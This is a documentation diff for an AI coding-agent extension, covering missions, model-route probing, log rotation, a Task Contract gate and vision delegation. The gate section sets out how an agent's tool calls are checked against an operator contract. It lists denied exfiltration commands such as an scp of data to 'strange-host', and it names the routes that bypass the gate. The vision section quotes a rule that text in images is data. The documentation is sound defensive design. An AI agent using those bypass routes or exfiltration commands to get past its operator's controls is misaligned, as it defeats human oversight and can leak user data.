@@ -59,12 +59,20 @@ The pipeline runs **asynchronously** with progress notifications:
    and the ledger records it. Material findings spawn a fix round (a child
    candidate) instead.
 
-## Orchestration missions (automatic, no slash command required)
+## Orchestration missions (explicit; no longer automatic)
 
-Normal-language intent automatically invokes the orchestration workflow through
-the semantic `mission` tool. An optional `/mission <request>` command runs the
-same pipeline explicitly (correctness never depends on it). See
-[`docs/orchestration.md`](orchestration.md) for the full design.
+A Mission starts when you ask for one: `/mission <request>`, or the model calling
+the `mission` tool because you asked for a durable, verified run. Ordinary
+coding prompts no longer start a Mission by default; they run in the normal
+interactive session, and `/work` shows the tasks, runs and verification.
+See [`docs/orchestration.md`](orchestration.md) for the full design.
+
+The earlier behaviour (an engineering-intent prompt is told to run through the
+`mission` tool) is still available with `execution.legacy_auto_invoke: true` in
+`engineering.yaml`. **That setting is deprecated** and planned for removal once
+the criteria in
+`docs/specs/pi-engineering-missionless-fabric-20261028-v1/PHASE-6-RETIREMENT.md`
+hold; nothing has been removed yet, and `/mission` and the `mission` tool stay.
 
 ```bash
 /mission Add a health endpoint
@@ -348,8 +356,13 @@ never loaded: while a tracked file has uncommitted changes, a new commit is
 not reloaded either (the handover would copy the half-edit); you are told
 once, and the reload happens as soon as the tree is clean, or at once with
 `/pie reload`. Summary and compaction calls, which have no turn to continue,
-wait out a gateway hold instead of switching models. `/pie update` does the same immediately (and, when the checkout
-has not moved, checks the update remote as before). `PI_ENGINEERING_AUTO_RELOAD=0`
+wait out a gateway hold instead of switching models. `/pie update` does the same immediately, and it always asks the update remote
+first: if the checkout's HEAD is behind the channel tip, the tip is installed
+instead of the checkout being reloaded (a checkout 463 commits behind main used
+to hot-reload itself and report success). A checkout that carries the tip — a
+merge you just made, or unpushed development work on top of it — is still
+reloaded, because that is the update you meant. `--check` reports both, and
+`--channel`/`--commit` always go to the remote. `PI_ENGINEERING_AUTO_RELOAD=0`
 turns the automatic reload off.
 
 A session on another host, loading pi-engineering from a clone that tracks
@@ -520,15 +533,92 @@ remain at 20% while a slow model answers. The panel clears on completion,
 failure or cancellation.
 
 Gateway aliases are kept and probed under their advertised route ID; a working
-backing model does not prove that its aliases work. The progress panel and final
-report show `alias → backing-model` when the gateway supplies that relationship.
-New aliases inherit input, reasoning, output limit, cost and compatibility
+backing model does not prove that its aliases work. The gateway names what answers
+behind a route with `x_members` on the route row — the concrete ids that serve it,
+and nothing else. The progress panel and final report show
+`alias → member[, member…]`; a route with one member records it as the backing
+model, a route with several (failover) records them all and names none as "the"
+backing model, because choosing one would guess. New aliases inherit input,
+reasoning, output limit, cost and compatibility
 settings from their configured backing model when available, bounded by the
 alias's advertised context window. Other additions report inferred settings.
 Existing model names and settings survive refresh, and identical IDs in two
-providers remain separate entries. Aliases only listed as `x_aliases` on a
-concrete model are descriptive metadata; refresh does not invent route entries
-that the gateway has not separately advertised.
+providers remain separate entries.
+
+**The probe decides which routes exist; the listing alone never does.**
+`GET /v1/models` is not authoritative on a real gateway. Recorded live on
+2026-11-03 against `llm.metabolomics.us/v1`, it returned seven rows while eleven
+routes answered `/v1/chat/completions` — and two of those seven advertised rows,
+`laya` and `laya-text`, produced no completion at all (a plain request got 404
+`Model laya is not served here`; an hour later the same route returned HTTP 200
+with an empty message). A refresh that trusted the listing
+therefore deleted working models (the operator report that opened this was "I
+still don't see the `qwen3.8-27b` alias", and a refresh really had pruned it)
+while adding routes that cannot serve a request. With probing on, which is what
+`/model-refresh` does, refresh gathers route names from three sources:
+
+- aliases the gateway advertises with `x_alias`;
+- the family / size / modality combinations implied by the concrete rows it
+  lists, in **both** modalities — `qwen3.8-27b-text` answers even though the
+  only listed 27B build is a vision one;
+- every configured route name the listing no longer covers.
+
+Each candidate is configured **only if a completion answers for it**, and is
+removed only if a completion refuses it *and* no listing claims it. A name
+nothing advertises is written as
+`qwen3.8-27b-text → … (gateway route; answers, not advertised)`, so the weaker
+evidence is visible exactly where the model gets chosen. Where probing cannot
+run — a library caller, or a provider API that cannot be probed — nothing is
+added from a name alone and nothing is deleted for being unlisted; those entries
+are reported as `kept without evidence`. An id that follows the concrete
+`<family>-<size>-modality-…-quant-…` grammar names a build rather than a route:
+alias mode replaces builds with their routes, so a build the listing no longer
+shows is retired without needing a probe.
+
+A written alias name says what answers behind it, so `/model` and the status line
+never leave that ambiguous: `qwen3.8-text →
+qwen3.8-flash_next-modality-text-quant-w3a8 (gateway alias)`, or
+`qwen3.8 → 27b/flash/flash_next ×4 (gateway alias)` when several members
+share the route and a failover between them changes the model — the size classes
+are named, and the member ids are in the report rather than the picker label. Canonical ids carry
+their size class (`<family>-<size>-modality-…`), so `qwen3.8-27b-…` is the 27B build
+and `qwen3.8-flash_next-…` is Flash-Next; an id outside that grammar has no size
+class and none is invented. Where an alias's own name says nothing about what it
+runs, refresh reports it — `ambiguous: qwen3.8-text — it runs
+qwen3.8-flash_next-modality-text-quant-w3a8 (flash_next), which the name does not
+say` — because a session on that name is on Flash-Next while the name implies
+nothing of the sort. Pin the concrete id, or a name carrying the class
+(`qwen3.8-flash_next-text`), when cost or quality depends on which model answers.
+Which class a route answers with is the gateway's decision and can change between
+runs; the report reflects `x_members` at the moment it ran.
+
+Because refresh configures aliases only, it also moves pins that still name a
+concrete id — otherwise they would dangle the moment that id leaves the catalogue.
+It rewrites `provider/id` references in `~/.pi/agent/settings.json`,
+`~/.pi/agent/engineering.yaml` and the repository's `.pi/engineering.yaml`, plus a
+`defaultModel` paired with `defaultProvider`. Edits are textual, so comments and
+layout survive; each changed file is copied to `<file>.bak-<timestamp>-model-refresh`
+first, file modes are kept, a `--dry-run` writes nothing, and a second pass changes
+nothing. A glob such as `metabolomics/*` is not a pin and is never touched.
+
+**A pin only moves onto an alias that answers as the model it named.** Membership
+decides this when the gateway publishes `x_members`: the pinned model must be a
+member, or every member must be of the pinned size class. Where membership is
+unpublished, the alias name must carry the class. So a pin on
+`metabolomics/qwen3.8-27b-modality-vision-quant-q8_k_xl` moves to
+`qwen3.8-27b-vision`, never to `qwen3.8`, whose members also include Flash — the
+move that would quietly change which model runs. When nothing covers the pin
+faithfully it is left exactly as written and reported:
+
+```
+pin not moved: …/engineering.yaml names metabolomics/qwen3.8-27b-…, which no served
+alias covers (metabolomics/qwen3.8 its members are flash, flash_next, not 27b)
+```
+
+That is deliberate: a pin that names no configured model fails visibly, while a
+pin widened to a family alias runs a different model without saying so. Pick a
+route whose members are the class you meant, or configure the concrete id with
+`PI_MODEL_REFRESH_CONCRETE=1 /model-refresh`.
 
 `/model-refresh` probes each model with one minimal request: 64 output tokens, no
 streaming, no tools, no images. A model whose probe gets HTTP 400 is retried
@@ -578,7 +668,8 @@ can be computed per worker.
 
 - `PI_WORKER_TRANSCRIPTS` (`on`|`off`, default `on`).
 - `PI_WORKER_TRANSCRIPT_MAX_BYTES` (default 5 MiB): per-file cap; the file rotates
-  to `<file>.1` (one predecessor kept).
+  to `<file>.<timestamp>.<n>`; earlier generations are never overwritten or deleted
+  (prune old rotations yourself).
 - `PI_WORKER_TRANSCRIPT_TOOL_CHARS` (default 4000): cap per tool argument/result.
 
 Transcripts are keyed by the mission's state worktree (the orchestrator's identity), then
@@ -586,11 +677,11 @@ by mission id. Redaction is key-aware (password/secret/token/api key/authorizati
 values in JSON and `KEY=value` lines), covers Basic/Bearer headers, URL userinfo and
 sensitive query params, known token prefixes, prose ("password is X") and PEM blocks.
 The per-turn line does not count as worker activity for the inactivity watchdog.
-runtime.jsonl rotation is per process: two processes sharing one file may overwrite `.1`.
+runtime.jsonl rotation never overwrites: each rotation gets a fresh `.<timestamp>.<n>` name and concurrent processes rotate one at a time under a `<file>.rotate.lock` sidecar. A rotation failure is reported as a telemetry warning and the live file keeps growing until it is fixed; rotated files are never deleted automatically.
 
-The worktree janitor must leave `transcripts/` alone except by age.
+The worktree janitor must leave `transcripts/` alone; nothing deletes rotated transcripts automatically.
 
-`sessions/<id>/runtime.jsonl` is capped: it rotates to `runtime.jsonl.1` at
+`sessions/<id>/runtime.jsonl` is capped: it rotates to `runtime.jsonl.<timestamp>.<n>` (never overwriting older rotations) at
 `PI_RUNTIME_LOG_MAX_BYTES` (default 10 MiB). `lease.contended` is logged once per
 (resource, holder); repeats are counted and a `lease.contended_summary` line
 carries the counters every `PI_RUNTIME_CONTENTION_SUMMARY_MS` (default 5 min).
@@ -733,7 +824,7 @@ rather than a branch name that could move after verification.
 | `/mission pause <id>` | Pause one named mission (no live turn needed). Esc pauses the turn on screen; this pauses the mission you name. Its work is kept and only `/mission resume <id>` continues it. |
 | `/mission G`   | Orchestration mission pipeline (intent → plan → execute → validate → review → complete). Esc pauses it; `/mission resume <id>` continues it and `/mission cancel <id>` ends it. |
 | `/mission-status` | Show orchestration mission/task/execution status.          |
-| `/room [say <text> \| assign <agent> <text> \| rooms]` | Thin client over Herdr's room API (needs the `herdr:` block): project tree, current agents, attention inbox and a link to the full graph; post a message or assign work. No local state; closing Pi cancels nothing. |
+| `/room [say <text> \| assign <agent> <text> \| rooms \| log [simple\|activity\|expert] [--after <sequence>]]` | Thin client over Herdr's room API (needs the `herdr:` block): project tree, current agents, attention inbox and a link to the full graph; post a message or assign work; `log` prints the room's events (simple = chat and finished or blocked tasks, activity adds every task change, expert adds sequence and event id) with terminal escapes stripped. No local state; closing Pi cancels nothing. |
 | `/engineering-mode [m]` | Show or set the execution mode (`auto`, `planner-worker`, `single`). |
 | `/engineering-status` / `-plan` / `-workers` | Planner/worker mission status, contract DAG, role/model telemetry. `-status` also shows the session's mission model (`model: X (operator pin)`). |
 | `/engineering-model [auto]` | Show the model this session's missions use; `auto` clears the operator pin set by `/model`. |
@@ -957,6 +1048,32 @@ on by default):
 
 `PI_TOOL_CALL_GUARD=0` turns the guard off.
 
+### Work status row: idle-session limit
+
+The compact work status row names every session with a live run, then at most
+`execution.status_idle_sessions` idle sessions (unresolved work, no live run),
+most recently active first, and collapses the rest into `+K idle`. YAML only
+(`.pi/engineering.yaml`), default 3, range 0..50; an out-of-range value falls
+back to the default. Live sessions are never hidden. `/summary <session id>`
+shows one session's tasks, attempts/retries, live runs and last activity (PRs
+appear once a PR source is wired; the work projection itself carries none).
+
+### Worker tool-loop guard
+
+Mission workers have their own cross-turn guard (`src/workers/toolLoopGuard.ts`).
+When `execution.tool_loop_limit` (YAML, default 3, range 2..100) consecutive
+completed tool calls are the *same call*, the worker is stopped and fails with
+`error: "tool-loop"` (summary and `details.tool_loop` give the tool, the count and
+the truncated last arguments; the ledger's `agent.failed` event carries both), so
+the mission can retry or re-route. "Same" means: same tool, same arguments after
+whitespace collapsing and key sorting, AND the same result text and error flag.
+For `bash`, a short scratch file the command itself creates (bare name, stem of
+at most 4 characters, target of `>`, `>>` or `tee`; e.g. `cat > pa.mjs <<EOF`) is
+masked, so commands differing only in that name compare equal. Any file-changing
+tool call (`edit`, `write`, ...), a different tool, different arguments or a
+different result resets the count, so polling with changing output, re-running
+tests after an edit and reading different files never trip it.
+
 ## Primary worktree guard
 
 The extension enforces the one-agent-one-worktree rule (AGENTS.md: each agent
@@ -1036,6 +1153,135 @@ mutating form is a gap to close when it bites, not a contract hole. `git -C`,
 The runtime's own in-process git operations (mission workers run in candidate
 worktrees; integration, janitor) do not go through the tool-call hook and are
 unaffected.
+
+## Task Contract gate (task discipline)
+
+A **Task Contract** is a trusted, versioned snapshot of what one task is allowed
+to touch: its objective, the roots it may read, the roots it may write, the
+remote hosts it may contact, the external effects (push, CI dispatch, deploy,
+restart) it may cause, and its acceptance criteria. It is written by the
+operator or the control plane — never by the model — and the gate in
+`src/taskDiscipline/` judges every tool call against it **before** the call
+executes.
+
+The gate registers its own `tool_call` and `user_bash` handlers, so it does not
+inherit the lifecycle controller's two gaps: that controller skips non-mutating
+tools (reads, MCP/custom tools) and auto-allows when the session is unattended.
+Here every call is judged, reads included, and `!bash` typed by the operator
+goes through the same engine (a blocked `!bash` returns a synthetic failed
+result instead of running).
+
+Knobs (set before starting the session):
+
+- `PI_TASK_DISCIPLINE` — `off` (default) | `audit_only` | `enforce_diagnostic` |
+  `enforce_all`. A value that is not one of those is treated as `enforce_all`:
+  a typo must not weaken enforcement.
+- `PI_TASK_CONTRACT_FILE` — path to the contract JSON. In an enforcing mode a
+  missing, unreadable or invalid contract **locks the session down** (nothing
+  readable, nothing writable) rather than falling back to "allow everything".
+- `PI_TASK_DISCIPLINE_LOG` — append-only JSONL of every decision (allow, deny,
+  would-deny) with the task id, contract revision, contract hash, rule and a
+  secret-redacted command. Defaults to `decisions.jsonl` next to the contract.
+
+The contract file and the decision log are always added to the contract's
+`protectedPaths`, and so is the contract's directory — unless it overlaps a
+`writeRoots` or `scratchRoots` entry (as in the example above, where the scratch
+root sits inside the contract directory), because protecting it there would
+swallow the whole tree the task may write in. The agent therefore cannot rewrite
+its own authorization or its own record — a write to a protected path is denied
+with `write.protected`.
+The file is re-read when its mtime or size changes, so an operator amendment
+takes effect on the next tool call and the new `policyRevision` appears in the
+log; a rewrite that tries to *widen* an investigation contract is rejected at
+parse time and the provider substitutes the lockdown contract immediately, so
+self-approval is impossible even with filesystem access — the agent loses access
+instead of gaining scope.
+
+What each mode enforces:
+
+- `audit_only` — nothing is blocked; a call the contract forbids is logged as
+  `would_deny` and the agent is told it is not protected. Use it to learn a
+  contract's false-block rate before turning it on.
+- `enforce_diagnostic` — blocks only while the **contract's** mode is
+  `investigation` or `review`, which is the tier the spec calls strict
+  diagnostic: read-only work must not deploy or ship data anywhere.
+- `enforce_all` — blocks in every contract mode.
+
+Rules the engine can deny with (each decision names its rule id): `read.outside_roots`,
+`write.outside_roots`, `write.protected`, `write.readonly_mode`,
+`exec.outside_roots`, `host.not_allowed`, `host.unresolved`,
+`effect.container.not_granted`, `effect.privileged`, `command.unclassified`,
+`path.unresolved`, `tool.not_allowed`, `shell.no_command`, `shell.powershell`,
+`write.no_path`, `engine.error`. Commands are classified, not pattern-matched:
+the classifier expands `sh -c`, `bash -c`, `eval`, `$(…)`/backticks, pipes,
+`xargs`, `find -exec`, `sudo`, `make` targets, `npm run` scripts, Python/Node
+scripts, `docker`/`podman` runs, and the remote verbs `ssh`, `scp`, `sftp`,
+`rsync`, `curl`/`wget` with a write verb, `git push`, `gh workflow run`,
+`kubectl`, `terraform`. Paths are canonicalised before comparison, so `..`,
+`~`, unexpanded `$VAR` and symlinks that walk out of a read or write root are
+caught (`path.unresolved`, `write.outside_roots`). An effect the classifier
+cannot identify is denied in an enforcing mode (`command.unclassified`) instead
+of being waved through.
+
+Denials are also loop-aware: more than three enforced denials of the same rule
+inside ten calls marks a policy incident, and further block messages tell the
+agent to stop retrying and report what is blocking it — the route out is an
+operator amendment, never another path around the rule.
+
+Enabling it for one mission, end to end:
+
+```sh
+mkdir -p ~/task-contracts
+cat > ~/task-contracts/peak-picking.json <<'JSON'
+{
+  "taskId": "demo-peak-picking-001",
+  "objective": "Diagnose the local LC-MS peak-picking discrepancy from code, fixtures and logs; report root cause with reproducible evidence.",
+  "mode": "investigation",
+  "policyRevision": 1,
+  "readRoots": ["/Users/me/IdeaProjects/cdf2ms"],
+  "writeRoots": [],
+  "scratchRoots": ["/private/tmp/peak-picking"],
+  "allowedHosts": [],
+  "externalEffects": [],
+  "acceptanceCriteria": ["Reproduce locally or name the blocker", "Name the defect with file and test evidence"]
+}
+JSON
+PI_TASK_DISCIPLINE=enforce_diagnostic \
+PI_TASK_CONTRACT_FILE="$HOME/task-contracts/peak-picking.json" \
+  pi --no-extensions --extension /absolute/path/to/checkout/extensions/index.ts
+```
+
+(One runtime per session, as above: `--no-extensions` plus the checkout, or the
+installed package with the two variables in the environment — not both.)
+
+In that session `scp ./peaks.mzML strange-host:/data/` — and the `rsync`,
+`curl -T`, `git push` and `gh workflow run` equivalents — is denied before
+execution, the denial lands in `decisions.jsonl`, and the agent is told to
+continue with local reads; the investigation does not stop. `write` anywhere is
+denied (`write.readonly_mode`, because the contract has no `writeRoots`). To let
+it patch the fix, the operator raises `policyRevision`, adds `writeRoots` and
+the mode changes to `implementation` — the model cannot do that itself.
+
+Mission workers of a gated session are gated too, under a **narrowed child
+contract** rather than the parent's: their write roots are the worktree the
+scheduler allocated them, their external effects are empty (they propose, the
+host executes), they may reach an allowed host only if the parent itself had
+`remote_read`, and a read-only role is capped at `review`. A worker whose
+request cannot be expressed inside the parent's scope — an implementer under a
+`review` contract, or a worktree outside the parent's write roots — is refused
+before any model call (`error: task-scope-refused`) instead of being handed the
+parent's wider scope.
+
+**What the gate cannot promise** (see `docs/operations/task-discipline.md`):
+it is a preflight check inside the Pi process, so it covers calls that come
+through Pi's `tool_call` / `user_bash`. A shell the agent reaches outside those
+hooks, a compiled binary that opens its own socket, or a local root shell
+bypass it. Defence in depth for indirect exfiltration in strict diagnostic mode
+relies on the Linux sandbox the control plane can start (`collab-sandbox.sh`
+profile `task-restricted-v1` with `--unshare-net` plus the
+`collab-egress.py` host allowlist); **macOS has no equivalent today**, so a
+local macOS session gets preflight gating only and must not be described as
+isolated.
 
 ## Recovering an interactive turn after the gateway wait is spent
 
@@ -1234,10 +1480,13 @@ milestones as `IMPLEMENTED`; run `/mission` on a fixture repo by hand and read
 ## Optional Blackhole session memory
 
 `pi-blackhole` is an **optional** per-session memory/context provider, pinned to
-**0.5.4**. It is disabled by default and backward compatible. When enabled it
+**0.5.4**. The standalone provider is disabled unless configured; the Pi extension
+enables it with the Hindsight store because durable memory is on by default
+(`memory.hindsight.enabled: false` turns it off). When enabled it
 provides session-local memory with strict candidate isolation, recall into worker
-context, evidence-gated promotion through the OpenViking durable-memory
-abstraction (never auto-promoted), and lower-priority background memory workers.
+context, evidence-gated promotion through the durable-memory abstraction
+(`HindsightDurableMemory` for the cross-machine store; never auto-promoted), and
+lower-priority background memory workers.
 
 ```sh
 node scripts/pi-engineering.ts blackhole status        # show manager state
@@ -1261,8 +1510,8 @@ the backing store for shared durable memory (default `memory` = single process):
 // Several workers on one host / CI share promoted memory via an append-only JSONL file.
 blackhole: { config: { enabled: true, durable: { kind: "shared-file", file: "/shared/durable.jsonl" } } }
 
-// Cross-machine sharing via the external OpenViking service.
-blackhole: { config: { enabled: true, durable: { kind: "openviking", baseUrl: "https://openviking.example", token } } }
+// Cross-machine sharing through the herdr-memory CLI (Hindsight).
+blackhole: { config: { enabled: true, durable: { kind: "hindsight", cli: "herdr-memory", scopes: ["project"] } } }
 ```
 
 Each `runWorker` hydrates its context from shared durable memory on run, so a
@@ -1271,60 +1520,112 @@ later/other worker consumes knowledge promoted by any earlier worker (spec:
 outage degrades hydration to an empty result and never fails the worker.
 `pi-engineering blackhole status` reports the active `durable` kind.
 
-### Running the OpenViking service (tier-1)
+`openviking` is **not** a valid kind any more. The HTTP transport and the
+`services/openviking` service it spoke to were retired, and the `herdr-memory`
+CLI replaced them as the cross-machine store. A configuration that still names
+the retired kind fails validation with a message naming the kinds that work,
+rather than falling back to an in-process store and quietly leaving every worker
+memoryless on a multi-host run.
 
-The `openviking` durable kind points workers at a shared HTTP service. A minimal
-containerized implementation lives at `services/openviking/` — a thin,
-stateless HTTP layer over a PostgreSQL backing store that serves exactly the
-contract `OpenVikingProvider` speaks (POST `/memory`, GET `/memory`,
-`GET /memory/search?q=`). Deploy on a single host (e.g. a lab box):
+### Turning the connection on anywhere pi is installed (no code edits)
 
-```sh
-cd services/openviking
-cp .env.example .env     # set OPENVIKING_TOKEN + POSTGRES_PASSWORD
-# run the service standalone (in-memory, zero deps) for a quick check:
-node src/index.mjs
-# or run the durable Postgres-backed deployment:
-docker compose up -d --build
+Durable memory is **on by default**. Any pi installation that loads this package's
+**extension** uses Hindsight with no configuration at all, so what is remembered in
+another harness is recalled in Pi too. Configuration is YAML only; **no
+environment variables are read** (the old `PI_HINDSIGHT_*` variables are
+ignored, with a one-time warning naming the key to use instead). Pi shells out to
+`herdr-memory` and holds no memory credential of its own: the CLI resolves its own
+configuration and token, so there is no host, key or key file for pi to store, and
+no secret belongs in YAML. Add this to the global `~/.pi/agent/engineering.yaml`
+(or `$PI_CODING_AGENT_DIR/engineering.yaml`):
+
+```yaml
+# ~/.pi/agent/engineering.yaml (global). `cli` is honored only here.
+memory:
+  hindsight:
+    enabled: true                 # default true; set false to turn durable memory off
+    cli: herdr-memory             # executable to shell out to (global config only)
+    scopes: [project]             # project, global, infra, mission:<id>
+    timeout_ms: 5000              # per-call CLI timeout, 100..60000
+    automatic_recall_ms: 1200     # in-turn recall budget, 100..5000
+    harness: pi                   # provenance/credential harness name the CLI sees
+    failure_backoff_ms: 60000     # pause automatic requests after a timeout/bad exit, 1000..3600000
+    unavailable_backoff_ms: 300000 # ... after a missing CLI or refused write, 1000..86400000
 ```
 
-Because the service is stateless (all memory lives in the Postgres volume), you
-can later move it to AWS/Fly.io and keep the data. See
-`services/openviking/README.md`. The production deployment runs on the lab's
-your-host server as an Apptainer container behind an nginx virtual host — see
-`docs/deployments/openviking-deployment.md`.
+| Key | Default | Range / values |
+| --- | --- | --- |
+| `enabled` | `true` | `true` / `false` (`false` turns durable memory off) |
+| `cli` | `herdr-memory` | non-empty executable name or path; global config only |
+| `scopes` | `[project]` | non-empty list of `project`, `global`, `infra`, `mission:<id>` |
+| `timeout_ms` | `5000` | 100..60000 |
+| `automatic_recall_ms` | `1200` | 100..5000 (interactive turn; a headless `pi -p` run waits 5000) |
+| `harness` | `pi` | `[a-z][a-z0-9_-]{0,31}` |
+| `failure_backoff_ms` | `60000` | 1000..3600000 |
+| `unavailable_backoff_ms` | `300000` | 1000..86400000 |
 
-### Installing the connection anywhere pi is installed (no code edits)
+**Turning it off.** Put `memory: { hindsight: { enabled: false } }` in the global
+`engineering.yaml` (or a repository's `.pi/engineering.yaml` to opt a single repo out).
+Pi then makes no `herdr-memory` call and `/memory` reports `off`.
 
-Any pi installation that loads this package's **extension** connects to a shared
-OpenViking automatically when the environment is set — no per-repo code. Set
-these once (e.g. in `~/.bashrc`, a systemd unit, or a `.env` the pi process
-loads):
+**Cross-harness recall.** Pi and the other harnesses (Claude, Codex, OpenCode) talk
+to the same Hindsight server through the same `herdr-memory` CLI, but each harness
+has to be wired up once with `herdr-eng memory install`. Notes are shared by scope:
+`scopes` defaults to `[project]`, so only project notes cross harnesses; add
+`scopes: [project, global]` to also share global notes.
 
-```sh
-export PI_OPENVIKING_BASE_URL=https://viking.example.com
-# Bearer token for the service — either inline, or from a file (secret hygiene):
-export PI_OPENVIKING_TOKEN=<token>
-# or: export PI_OPENVIKING_TOKEN_FILE=/path/to/token.txt
-# Optional: bounded wait for the provider (default 10000ms):
-export PI_OPENVIKING_PROVIDER_TIMEOUT_MS=10000
-# Optional: explicitly force the connection off:
-# export PI_OPENVIKING_ENABLED=0
-```
+**When the CLI is missing or has no credential.** Pi starts normally and degrades
+quietly: at most one concise notice per session (and one telemetry line per day
+when headless), then automatic recall and saves stay silent best-effort until the
+`unavailable_backoff_ms` window passes. The once-per-session connection check waits
+up to 5 s (a healthy cold client takes seconds, and a status line that says "timed
+out" about a working service teaches people to ignore it), while an interactive turn
+waits `automatic_recall_ms` and a headless run 5 s. Run `/memory` (or
+`herdr-memory doctor`) to see what is wrong.
+A turn never proceeds in silence: if the budget expires the model is told memory
+"could not be read this turn … unavailable, not empty", and an answer that arrives
+late is used by the next model call of the same turn. The measurements behind these numbers are in
+[Hindsight memory status](integration/HINDSIGHT-MEMORY-STATUS.md).
 
-When `PI_OPENVIKING_BASE_URL` is set, the extension passes
-`blackhole: { config: { enabled: true, durable: { kind: "openviking", ... } } }`
+**What is sent.** Each turn Pi sends the CLI a recall query of up to 12 keywords from
+your prompt, and each worker run sends the first 120 characters of the task. Both are
+passed through secret redaction first and secret-looking tokens are dropped (a query
+that is only a secret makes no call). Notes are only written by `/remember`.
+After a timeout or failure, searches pause (`failure_backoff_ms`, or
+`unavailable_backoff_ms` for a missing CLI) for the interactive hooks and worker runs
+alike; worker runs wait at most 250 ms for memory.
+
+**Repository config is untrusted.** The global `engineering.yaml` is authoritative. A
+repository's `.pi/engineering.yaml` can only opt **out** (`enabled: false`) or **narrow**
+`scopes` to a subset of the global scopes. It cannot turn memory on over a global
+`false`, and `cli`, `harness`, `timeout_ms` and the backoffs are ignored there with a
+warning (`harness` selects the CLI's credential identity). Any
+invalid value fails closed: memory is turned off and `/memory` names the key to fix.
+Unknown keys under `memory.hindsight` are reported as warnings. The file is
+re-read at session start, at each turn and by `/memory`, so an edit takes effect
+without restarting.
+
+Unless `memory.hindsight.enabled` is false, the extension passes
+`blackhole: { config: { enabled: true, durable: { kind: "hindsight", ... } } }`
 into every `EngineeringRuntime` it opens, so all repos in that install share the
-deployed durable memory. Absent the env vars, blackhole stays off (backward
-compatible). Verify a connection with `/blackhole` in a pi session, or:
+same durable backend. With `enabled: false`, blackhole stays off. Verify a connection with `/blackhole` (or `/memory` for the
+interactive notes) in a pi session, or:
 
 ```sh
 node scripts/pi-engineering.ts blackhole status
+herdr-memory doctor        # the CLI's own credential/config check
 ```
 
-The resolver is `src/blackhole/envConfig.ts`; it is fail-closed (a malformed
-timeout falls back to the default; a missing token degrades recall to empty
-rather than crash).
+Artifacts are written under `docs/evidence/blackhole/`. The benchmark is a
+deterministic, model-free simulator (see the report methodology note) — it
+validates the measurement pipeline and shows the expected direction of effect,
+not a measured model claim.
+
+The loader is `loadHindsightSettings()` in `src/lifecycle/policy.ts` (schema and
+validation in `src/blackhole/hindsightSettings.ts`): configuration is fail-closed
+(an invalid value turns memory off and says which key), reads are fail-open (a CLI that cannot answer yields no notes
+rather than a failed turn), and writes only report the outcome the CLI actually
+acknowledged.
 
 ## Durable state
 
@@ -1653,3 +1954,169 @@ External web consumers receive additive `waitingSince`, `lastOutputAt`,
 `currentActivityStartedAt` and worker timing fields in the mission snapshot. They should derive
 elapsed times from these timestamps locally. This package does not control the separate web
 plugin's redraw loop; the runtime does not rewrite snapshots every second just to animate a timer.
+
+## Vision delegation for text-only models
+
+When the current model has no image input (its `models.json` entry lacks `"image"` in `input`), Pi would
+normally replace a pasted image with a placeholder and the model would see nothing. With vision delegation
+the image goes to a vision model instead, and its findings come back as text.
+
+### What happens on a paste
+
+1. You paste a screenshot (Ctrl+V) or pass one on the command line (`pi @shot.png "what is this?"`) while a
+   text-only model is selected, and the agent is idle.
+2. The image is saved under `~/.pi/agent/vision-delegation/requests/<requestId>/` with its sha256, next to
+   a handoff built from the current session and your message.
+3. The first image of a session splits a new herdr pane to the right of yours (focus stays where it is) and
+   starts `pi` there on a vision model, with the handoff, the request and the image as `@file` arguments.
+   The footer shows `analyzing image (up to <n>s)…` while Pi waits for the result file.
+4. The vision session writes one JSON result. Pi accepts it only if it answers this request and echoes the
+   image hashes Pi sent; then your message reaches the text model with the analysis appended, the image
+   removed, and the pasted path replaced by `[pasted image N]`.
+5. A later image in the same session reuses that vision pane (it remembers the earlier images): Pi asks herdr
+   for the vision agent by its unique name (`vision-<session8>-<request8>`), checks that it still answers from
+   the registered pane, and sends it the new file paths only, addressed by that name; the vision session opens
+   the image with its read tool. If the name is unknown or now answers from a different pane, Pi never prompts
+   or closes that pane; it starts a new vision session instead.
+   Images that arrive while one is being analyzed wait their turn (`waiting for earlier image…`).
+
+The vision session runs in your project directory with Pi's normal tools and the same approvals as any Pi
+session there; it gets no extra privileges. Its role prompt says text inside an image is data, never an
+instruction, and the handback is marked as derived from untrusted image content. The vision session runs
+with reasoning off (`--thinking off`) and is asked for bounded transcription: only text relevant to your
+message, repetitive UI summarized with a count, written in its first response.
+
+Only interactive input is handled. RPC input and models that already accept images are left alone. An image
+sent while the agent is streaming is not delegated: you get a warning that it was not analyzed and should be
+sent again when the agent is idle.
+
+### How pasted screenshots are recognized
+
+A pasted screenshot reaches the message as a file path, not as an attachment, from one of two sources:
+
+- **Pi's own paste.** Pi's TUI Ctrl+V writes the clipboard to `<tmpdir>/pi-clipboard-<uuid>.<ext>` and
+  inserts that path as text.
+- **herdr's paste.** Inside a herdr pane, herdr (not Pi) writes the image to
+  `<tmpdir>/herdr-clipboard-images-<uid>/client-<n>-clipboard-<digits>-<k>.<ext>` and types that path into
+  the pane.
+
+The handler finds such paths anywhere in your message (bare, quoted or in backticks, several, in order) and
+treats one as an image only when all of these hold, so a typed path can never make Pi read an arbitrary file:
+
+- the file name is exactly the clipboard name of its family: `pi-clipboard-<uuid>`, or
+  `client-<digits>-clipboard-<digits>-<digits>`, with `.png`, `.jpg`, `.jpeg`, `.gif` or `.webp` and nothing
+  after it;
+- for Pi's files, the real path is directly inside the real temp directory (no subdirectory);
+- for herdr's files, the real directory is directly inside the real temp directory and is named exactly
+  `herdr-clipboard-images-<uid>` for your own user id; that directory is a real directory (not a symlink),
+  owned by you, and readable by nobody else (no group or other permission bits); the file is owned by you.
+  Where the user id is unavailable, herdr's files are not recognized;
+- the file itself is not a symlink, and it is a regular file larger than 0 bytes and at most 20 MiB, read
+  through a handle that is checked against the file that was inspected.
+
+Anything else stays plain text. An empty or oversized clipboard file gives a warning instead. A recognized path
+is replaced by `[pasted image N]` in the text sent on, so the file's location is not repeated. Images given on
+the command line or by an SDK caller arrive as real attachments and are delegated the same way.
+
+### Settings and the kill switch
+
+The block is read from the global `~/.pi/agent/engineering.yaml` only; a repository `engineering.yaml`
+cannot change it. Without the block the feature is on with these defaults:
+
+```yaml
+vision_delegate:
+  enabled: true                       # false is the kill switch
+  wait_seconds: 300                   # integer 10-3600: the longest wait for one image
+  alias_preference: [qwen3.8-vision]  # model ids tried first, in order
+```
+
+- `enabled: false` turns the feature off: the handler does nothing and Pi behaves as without it.
+- `wait_seconds` outside 10-3600, or not an integer at all, never turns the feature off: it keeps 300 and
+  shows a note.
+- `alias_preference` must be a non-empty list of non-empty strings.
